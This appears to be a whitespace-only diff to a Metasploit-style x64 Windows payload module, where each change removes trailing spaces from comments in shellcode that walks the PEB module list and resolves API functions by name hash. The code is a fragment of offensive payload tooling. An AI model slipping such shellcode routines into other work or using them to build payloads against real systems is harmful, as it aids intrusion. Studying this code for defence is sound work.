@@ -27,7 +27,7 @@ module Payload::Windows::BlockApi_x64
         mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list
       next_mod:                  ;
         mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)
-        movzx rcx, word [rdx+74] ; Set rcx to the length we want to check 
+        movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
         xor r9, r9               ; Clear r9 which will store the hash of the module name
       loop_modname:              ;
         xor rax, rax             ; Clear rax
@@ -42,12 +42,12 @@ module Payload::Windows::BlockApi_x64
         ; We now have the module hash computed
         push rdx                 ; Save the current position in the module list for later
         push r9                  ; Save the current module hash for later
-        ; Proceed to itterate the export address table, 
+        ; Proceed to itterate the export address table,
         mov rdx, [rdx+32]        ; Get this modules base address
         mov eax, dword [rdx+60]  ; Get PE header
         add rax, rdx             ; Add the modules base address
-        cmp word [rax+24], 0x020B ; is this module actually a PE64 executable? 
-        ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and 
+        cmp word [rax+24], 0x020B ; is this module actually a PE64 executable?
+        ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
         ; their may be a PE32 module present in the PEB's module list, (typicaly the main module).
         ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
         jne get_next_mod1         ; if not, proceed to the next module
@@ -56,7 +56,7 @@ module Payload::Windows::BlockApi_x64
         jz get_next_mod1         ; If no EAT present, process the next module
         add rax, rdx             ; Add the modules base address
         push rax                 ; Save the current modules EAT
-        mov ecx, dword [rax+24]  ; Get the number of function names  
+        mov ecx, dword [rax+24]  ; Get the number of function names
         mov r8d, dword [rax+32]  ; Get the rva of the function names
         add r8, rdx              ; Add the modules base address
         ; Computing the module hash + function hash
@@ -75,14 +75,14 @@ module Payload::Windows::BlockApi_x64
         cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
         jne loop_funcname        ; If we have not reached the null terminator, continue
         add r9, [rsp+8]          ; Add the current module hash to the function hash
-        cmp r9d, r10d            ; Compare the hash to the one we are searchnig for 
+        cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
         jnz get_next_func        ; Go compute the next function hash if we have not found it
         ; If found, fix up stack, call the function and then value else compute the next one...
         pop rax                  ; Restore the current modules EAT
-        mov r8d, dword [rax+36]  ; Get the ordinal table rva      
+        mov r8d, dword [rax+36]  ; Get the ordinal table rva
         add r8, rdx              ; Add the modules base address
         mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
-        mov r8d, dword [rax+28]  ; Get the function addresses table rva  
+        mov r8d, dword [rax+28]  ; Get the function addresses table rva
         add r8, rdx              ; Add the modules base address
         mov eax, dword [r8+4*rcx]; Get the desired functions RVA
         add rax, rdx             ; Add the modules base address to get the functions actual VA
